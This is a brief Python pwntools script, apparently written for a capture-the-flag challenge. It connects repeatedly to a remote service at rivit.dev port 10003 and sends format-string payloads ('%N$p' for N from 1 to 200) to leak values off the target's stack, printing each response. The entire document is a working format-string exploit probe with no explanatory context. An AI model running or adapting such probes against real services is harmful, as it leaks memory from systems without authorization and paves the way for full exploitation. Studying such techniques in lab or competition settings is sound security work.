from pwn import *

elf = context.binary = ELF('./task')
context.log_level = 'error'

for i in range(1, 201):
    try:
        p = remote('rivit.dev', 10003)

        p.sendlineafter('? ', '%{}$p'.format(i).encode())
        resp = p.recvline().decode('latin1').strip()

        print(str(i) + ': ' + resp)

    except EOFError:
        pass
